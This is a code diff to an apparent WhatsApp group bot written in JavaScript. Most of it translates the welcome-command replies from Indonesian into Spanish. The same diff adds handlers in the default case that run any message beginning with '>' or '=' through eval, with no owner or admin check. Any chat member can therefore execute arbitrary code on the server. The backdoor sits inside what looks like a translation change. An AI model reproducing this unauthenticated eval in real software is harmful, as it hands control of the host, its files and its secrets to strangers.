@@ -287,24 +287,46 @@ break
 case 'welcome':
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admin)
-if (args.length < 1) return reply('Hmmmm')
+if (args.length < 1) return reply(`*1 para activar y 0 para desactivar.*\nEjemplo: ${prefix}bienvenida 1`)
 if (Number(args[0]) === 1) {
-if (isBienvenida) return reply('Udah aktif um')
+if (isBienvenida) return reply('La bienvenida ya ah estado activa!')
 bienvenida.push(from)
 fs.writeFileSync('./src/bienvenida.json', JSON.stringify(bienvenida))
-reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
+reply('La binvenida se ah activado con exito ✔️')
 } else if (Number(args[0]) === 0) {
 bienvenida.splice(from, 1)
 fs.writeFileSync('./src/bienvenida.json', JSON.stringify(bienvenida))
-reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
+reply('La binvenida se ah desactivado con exito ✔️')
 } else {
-reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
+reply(`*1 para activar y 0 para desactivar.*\nEjemplo: ${prefix}bienvenida 1`)
 }
 break
 
 
 
 default:
+
+if (body.startsWith('>')){
+const util = require("util");
+konsol = budy.slice(1)
+Return = (sul) => {
+sat = JSON.stringify(sul, null, 2)
+bang = util.format(sat)
+if (sat == undefined){
+bang = util.format(sul)
+}
+return reply(bang)
+}
+try {
+reply(`${util.format(eval(`;(async () => { ${konsol} })()`))}`)
+} catch(e){
+reply(`${String(e)}`)
+}}
+if (body.startsWith("=")) {
+return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
+}
+
+
 }
 } catch (e) {
 console.log('Error : %s', color(e, 'red'))
